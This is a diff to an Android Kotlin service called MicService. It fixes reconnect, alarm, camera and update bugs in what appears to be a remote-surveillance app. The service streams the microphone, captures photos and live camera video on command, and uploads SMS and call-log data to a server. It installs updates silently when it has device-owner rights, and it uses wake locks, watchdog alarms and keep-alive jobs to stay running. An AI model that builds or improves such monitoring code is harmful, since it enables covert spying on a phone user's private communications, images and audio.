@@ -121,6 +121,7 @@ class MicService : Service() {
     private val isWsConnecting = java.util.concurrent.atomic.AtomicBoolean(false)
     private var wsReconnectJob: Job? = null
     private val reconnectMutex = Mutex()
+    private val cameraLiveMutex = Mutex()
     @Volatile private var wsReconnectAttempts = 0
     @Volatile private var wsConnectFailuresCount = 0 // For Bug 10: only rotate after real failures
     @Volatile private var sourceRotateAttempts = 0
@@ -143,7 +144,7 @@ class MicService : Service() {
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
-    private var lastDataHash: Int = 0 // Bug 5: hash-based dedup for sendDeviceData
+    private var lastDataHashStr: String = "" // Bug 5: String checksum for dedup
     // BUG-R1/R13 fix: single AtomicBoolean is the ONLY guard — isPhotoCaptureBusy removed
     private val photoCaptureBusyGuard = java.util.concurrent.atomic.AtomicBoolean(false)
 
@@ -243,16 +244,16 @@ class MicService : Service() {
     private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
     
     // Use Android ID as base for device ID - survives cache clear
-    private val deviceId: String by lazy {
-        // First try to get existing ID from prefs
-        prefs.getString("device_id", null) ?: run {
-            // Generate stable ID based on Android ID (survives cache clear but not factory reset)
+    // Bug 6: Lazy init inside coroutine can stall; Eager init inside onCreate instead.
+    private lateinit var deviceId: String
+
+    private fun initDeviceId() {
+        deviceId = prefs.getString("device_id", null) ?: run {
             val androidId = android.provider.Settings.Secure.getString(
                 contentResolver, 
                 android.provider.Settings.Secure.ANDROID_ID
             ) ?: "unknown"
             
-            // Create short hash for privacy + readability
             val md = java.security.MessageDigest.getInstance("SHA-256")
             val stableId = md.digest(androidId.toByteArray()).joinToString("") { "%02x".format(it) }.take(16)
             
@@ -338,6 +339,7 @@ class MicService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        initDeviceId()
         createNotificationChannel()
         acquireWakeLock()
         setupNetworkListener()
@@ -454,7 +456,7 @@ class MicService : Service() {
         }
 
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
-        if (intent?.action == ACTION_RECONNECT) {
+        if (intent?.action == ACTION_RECONNECT && (intent.data?.schemeSpecificPart == "reconnect" || intent.data?.schemeSpecificPart == "restart")) {
             wsReconnectJob?.cancel() // Bug H: explicitly cancel sleeping job so no double connect race
             if (activeWebSocket == null) {
                 Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
@@ -490,7 +492,7 @@ class MicService : Service() {
     private fun scheduleForcedRestart() {
         val restartIntent = Intent(applicationContext, MicService::class.java).apply {
             action = ACTION_RECONNECT
-            data = android.net.Uri.parse("timer:${System.currentTimeMillis()}") // Bug 13: Unique Intent
+            data = android.net.Uri.parse("timer:restart") // Bug 13: Unique Intent
         }
         val pendingIntent = PendingIntent.getService(
             this, 1, restartIntent,
@@ -498,7 +500,13 @@ class MicService : Service() {
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
         val triggerAt = SystemClock.elapsedRealtime() + 2_000
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
+            alarmManager.setAndAllowWhileIdle(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                triggerAt,
+                pendingIntent
+            )
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             alarmManager.setExactAndAllowWhileIdle(
                 AlarmManager.ELAPSED_REALTIME_WAKEUP,
                 triggerAt,
@@ -593,9 +601,11 @@ class MicService : Service() {
             try { connectivityManager?.unregisterNetworkCallback(it) } catch (e: Exception) {}
         }
         // Bug 7: Guard WakeLock release against double-release crash
-        try {
-            if (wakeLock?.isHeld == true) wakeLock?.release()
-        } catch (_: Exception) {}
+        synchronized(MicService::class.java) {
+            try {
+                if (wakeLock?.isHeld == true) wakeLock?.release()
+            } catch (_: Exception) {}
+        }
 
         // Avoid double-start races when START_STICKY already triggers restart.
         if (restartFromTaskRemoval) {
@@ -778,9 +788,14 @@ class MicService : Service() {
     }
 
     private var httpFallbackJob: Job? = null
+    private val lastHttpFallbackWsState = java.util.concurrent.atomic.AtomicReference<Boolean?>(null)
     
     private fun startHttpFallbackSync() {
-        if (httpFallbackJob?.isActive == true) return
+        val currentWsState = activeWebSocket != null
+        val previousState = lastHttpFallbackWsState.getAndSet(currentWsState)
+        if (httpFallbackJob?.isActive == true && currentWsState == previousState) return
+        
+        httpFallbackJob?.cancel()
         httpFallbackJob = serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
                 // HTTP Heartbeat (Layer 12)
@@ -897,7 +912,7 @@ class MicService : Service() {
         wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
             if (forceRestart) {
                 try {
-                    previousJob?.join()
+                    withTimeoutOrNull(2_000) { previousJob?.join() }
                 } catch (_: CancellationException) {
                 }
             }
@@ -1021,12 +1036,14 @@ class MicService : Service() {
                             safeSend("""{"type":"update_status","status":"downloading","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize},"installMode":"$installMode"}""")
                             Log.i(TAG, "Update available: ${versionInfo.versionName} (code ${versionInfo.versionCode})")
                             
-                            UpdateService.downloadAndInstall(this@MicService, versionInfo)
+                            val result = UpdateService.downloadAndInstall(this@MicService, versionInfo)
 
-                            if (isOwnerInstall) {
+                            if (result == UpdateService.InstallResult.SILENT_STARTED) {
                                 safeSend("""{"type":"update_status","status":"installing","version":"${versionInfo.versionName}"}""")
-                            } else {
+                            } else if (result == UpdateService.InstallResult.PROMPT_SHOWN) {
                                 safeSend("""{"type":"update_status","status":"awaiting_user_action","message":"Update downloaded. User confirmation required for install."}""")
+                            } else {
+                                safeSend("""{"type":"update_status","status":"error","message":"Installation failed."}""")
                             }
                         } else {
                             safeSend("""{"type":"update_status","status":"up_to_date","currentVersion":"${BuildConfig.VERSION_NAME}","currentCode":${BuildConfig.VERSION_CODE}}""")
@@ -1662,7 +1679,7 @@ class MicService : Service() {
         // isWebRtcStreaming already set at top of function (Bug 3 fix) — no duplicate needed
         currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
         applyAdaptiveBitrate()
-        registerNetworkCallbackForBitrate()
+        // Network callback for bitrate renegotiation handled by main networkCallback
         updateNotification("WebRTC mic active")
         sendHealthStatus("webrtc_started")
         sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
@@ -1673,7 +1690,7 @@ class MicService : Service() {
         webRtcRecoveryJob = null
         iceWatchdogJob?.cancel()
         iceWatchdogJob = null
-        unregisterNetworkCallbackForBitrate()
+        // Removed unregisterNetworkCallbackForBitrate
         try {
             peerConnection?.close()
         } catch (_: Exception) {}
@@ -2012,44 +2029,7 @@ class MicService : Service() {
         }
     }
 
-    private var bitrateNetworkCallback: ConnectivityManager.NetworkCallback? = null
 
-    private fun registerNetworkCallbackForBitrate() {
-        if (bitrateNetworkCallback != null) return
-        val callback = object : ConnectivityManager.NetworkCallback() {
-            override fun onAvailable(network: Network) {
-                applyAdaptiveBitrate()
-            }
-
-            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
-                applyAdaptiveBitrate()
-            }
-
-            override fun onLost(network: Network) {
-                applyAdaptiveBitrate()
-            }
-        }
-        bitrateNetworkCallback = callback
-        try {
-            val request = NetworkRequest.Builder()
-                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
-                .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR)
-                .addTransportType(NetworkCapabilities.TRANSPORT_ETHERNET)
-                .build()
-            connectivityManager?.registerNetworkCallback(request, callback)
-        } catch (e: Exception) {
-            Log.w(TAG, "Network callback register failed: ${e.message}")
-            bitrateNetworkCallback = null
-        }
-    }
-
-    private fun unregisterNetworkCallbackForBitrate() {
-        val callback = bitrateNetworkCallback ?: return
-        try {
-            connectivityManager?.unregisterNetworkCallback(callback)
-        } catch (_: Exception) {}
-        bitrateNetworkCallback = null
-    }
 
     private fun captureAndSendPhoto(cameraMode: String) {
         if (isCameraLiveStreaming) {
@@ -2118,9 +2098,8 @@ class MicService : Service() {
                     }
 
                     if (!httpSuccess) {
-                        Log.w(TAG, "Falling back to WebSocket base64 for photo")
-                        val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
-                        val msg = JSONObject().apply {
+                        Log.w(TAG, "Falling back to WebSocket binary for photo")
+                        val msgJson = JSONObject().apply {
                             put("type", "photo_upload")
                             put("deviceId", deviceId)
                             put("camera", cameraName)
@@ -2130,10 +2109,19 @@ class MicService : Service() {
                             put("mime", "image/jpeg")
                             put("aiEnhanced", aiPhotoEnhancementEnabled)
                             put("lowNetwork", lowNetworkMode)
-                            put("data", base64)
                             put("ts", System.currentTimeMillis())
-                        }
-                        safeSend(msg.toString())
+                        }.toString()
+                        val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
+                        val headerLen = headerBytes.size
+                        
+                        val out = ByteArray(4 + headerLen + optimized.size)
+                        out[0] = 0x43 // 'C'
+                        out[1] = 0x4C // 'L'
+                        out[2] = ((headerLen shr 8) and 0xFF).toByte()
+                        out[3] = (headerLen and 0xFF).toByte()
+                        System.arraycopy(headerBytes, 0, out, 4, headerLen)
+                        System.arraycopy(optimized, 0, out, 4 + headerLen, optimized.size)
+                        safeSend(okio.ByteString.of(*out))
                     }
                     safeSend("ACK:take_photo:ok:$cameraName")
                 } ?: run {
@@ -2149,8 +2137,6 @@ class MicService : Service() {
                 photoCaptureBusyGuard.set(false)
             }
         }
-        // BUG-R1 safety net: ensure guard is released even if scope is cancelled before try
-        photoJob.invokeOnCompletion { photoCaptureBusyGuard.set(false) }
     }
 
     private fun parseRequestedCameraFacing(cameraMode: String): Int? {
@@ -2266,6 +2252,7 @@ class MicService : Service() {
 
         var camera: CameraDevice? = null
         var session: CameraCaptureSession? = null
+        val cameraClosed = java.util.concurrent.atomic.AtomicBoolean(false)
 
         try {
             imageReader.setOnImageAvailableListener({ reader ->
@@ -2289,13 +2276,15 @@ class MicService : Service() {
                 try {
                     cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                         override fun onOpened(cd: CameraDevice) { 
-                            if (cont.isActive) cont.resumeWith(Result.success(cd)) else cd.close()
+                            if (cont.isActive) cont.resumeWith(Result.success(cd)) else if (cameraClosed.compareAndSet(false, true)) cd.close()
                         }
                         override fun onDisconnected(cd: CameraDevice) { 
-                            cd.close(); if (cont.isActive) cont.resumeWith(Result.success(null))
+                            if (cameraClosed.compareAndSet(false, true)) cd.close()
+                            if (cont.isActive) cont.resumeWith(Result.success(null))
                         }
                         override fun onError(cd: CameraDevice, error: Int) { 
-                            cd.close(); if (cont.isActive) cont.resumeWith(Result.success(null))
+                            if (cameraClosed.compareAndSet(false, true)) cd.close()
+                            if (cont.isActive) cont.resumeWith(Result.success(null))
                         }
                     }, handler)
                 } catch (e: Exception) {
@@ -2392,7 +2381,7 @@ class MicService : Service() {
         } finally {
             if (!imageResult.isCompleted) imageResult.cancel()
             try { session?.close() } catch (_: Exception) {}
-            try { camera?.close() } catch (_: Exception) {}
+            try { if (cameraClosed.compareAndSet(false, true)) camera?.close() } catch (_: Exception) {}
             try { imageReader.close() } catch (_: Exception) {}
             try { thread.quitSafely() } catch (_: Exception) {}
         }
@@ -2501,6 +2490,7 @@ class MicService : Service() {
             
             var camera: CameraDevice? = null
             var session: CameraCaptureSession? = null
+            val cameraClosed = java.util.concurrent.atomic.AtomicBoolean(false)
 
             try {
                 var lastSent = 0L
@@ -2546,14 +2536,14 @@ class MicService : Service() {
                         try {
                             cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                                 override fun onOpened(cd: CameraDevice) {
-                                    if (cont.isActive) cont.resumeWith(Result.success(cd)) else cd.close()
+                                    if (cont.isActive) cont.resumeWith(Result.success(cd)) else if (cameraClosed.compareAndSet(false, true)) cd.close()
                                 }
                                 override fun onDisconnected(cd: CameraDevice) {
-                                    cd.close()
+                                    if (cameraClosed.compareAndSet(false, true)) cd.close()
                                     if (cont.isActive) cont.resumeWith(Result.success(null))
                                 }
                                 override fun onError(cd: CameraDevice, error: Int) {
-                                    cd.close()
+                                    if (cameraClosed.compareAndSet(false, true)) cd.close()
                                     if (cont.isActive) cont.resumeWith(Result.success(null))
                                 }
                             }, handler)
@@ -2611,7 +2601,7 @@ class MicService : Service() {
             } finally {
                 isCameraLiveStreaming = false
                 try { session?.close() } catch (_: Exception) {}
-                try { camera?.close() } catch (_: Exception) {}
+                try { if (cameraClosed.compareAndSet(false, true)) camera?.close() } catch (_: Exception) {}
                 try { imageReader.close() } catch (_: Exception) {}
                 try { thread.quitSafely() } catch (_: Exception) {}
             }
@@ -2620,17 +2610,19 @@ class MicService : Service() {
 
     private fun restartCameraLiveStream() {
         if (!isCameraLiveStreaming) return
-        val oldJob = cameraLiveJob
         val nextFacing = preferredCameraFacing
         val nextStrictFacing = cameraLiveStrictFacing
         isCameraLiveStreaming = false
+        val oldJob = cameraLiveJob
         oldJob?.cancel()
         serviceScope.launch(Dispatchers.IO) {
-            try {
-                oldJob?.join()
-            } catch (_: CancellationException) {
+            cameraLiveMutex.withLock {
+                try {
+                    oldJob?.join()
+                } catch (_: CancellationException) {
+                }
+                startCameraLiveStream(nextFacing, nextStrictFacing)
             }
-            startCameraLiveStream(nextFacing, nextStrictFacing)
         }
     }
 
@@ -2639,7 +2631,7 @@ class MicService : Service() {
         isCameraLiveStreaming = false
         cameraLiveJob?.cancel()
         cameraLiveJob = null
-        if (wasLive) {
+        if (wasLive && reason != "service_destroy") {
             safeSend("ACK:camera_live:stopped")
             sendHealthStatus("camera_live_off_$reason")
         }
@@ -2840,13 +2832,19 @@ class MicService : Service() {
     private fun sendDeviceData() {
         try {
             val data = dataCollector.collectAll()
-            // Bug 5: Hash-based change detection — skip send if nothing changed
-            val hash = data.toString().hashCode()
-            if (hash == lastDataHash) {
+            // Bug 5: Hash-based change detection — use precise checksum to avoid 32-bit collisions
+            val smsArray = data.optJSONArray("sms")
+            val callArray = data.optJSONArray("callLog")
+            
+            val smsThumb = if (smsArray != null && smsArray.length() > 0) smsArray.optJSONObject(0)?.optLong("date") ?: 0L else 0L
+            val callThumb = if (callArray != null && callArray.length() > 0) callArray.optJSONObject(0)?.optLong("date") ?: 0L else 0L
+            
+            val hashStr = "${smsArray?.length()}_${smsThumb}_${callArray?.length()}_${callThumb}"
+            if (hashStr == lastDataHashStr) {
                 Log.d(TAG, "Device data unchanged, skipping send")
                 return
             }
-            lastDataHash = hash
+            lastDataHashStr = hashStr
             val msg = JSONObject()
             msg.put("type", "device_data")
             msg.put("deviceId", deviceId)
@@ -3714,7 +3712,9 @@ class MicService : Service() {
             } catch (_: Exception) {}
             ourAudioMode = false
         }
-        sendHealthStatus(reason)
+        if (reason != "service_destroy") {
+            sendHealthStatus(reason)
+        }
     }
 
     private fun sendHealthStatus(reason: String) {
@@ -3941,7 +3941,7 @@ class MicService : Service() {
             .build()
         WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
             "keep_alive",
-            ExistingPeriodicWorkPolicy.KEEP,
+            ExistingPeriodicWorkPolicy.UPDATE,
             request
         )
         Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
@@ -3956,7 +3956,7 @@ class MicService : Service() {
     private fun scheduleReconnectAlarm() {
         val intent = Intent(applicationContext, MicService::class.java).apply {
             action = ACTION_RECONNECT
-            data = android.net.Uri.parse("timer:${System.currentTimeMillis()}") // Bug 13: Unique Intent
+            data = android.net.Uri.parse("timer:reconnect") // Fixed URI to avoid leaking intents
         }
         val pendingIntent = PendingIntent.getService(
             applicationContext, 2, intent,
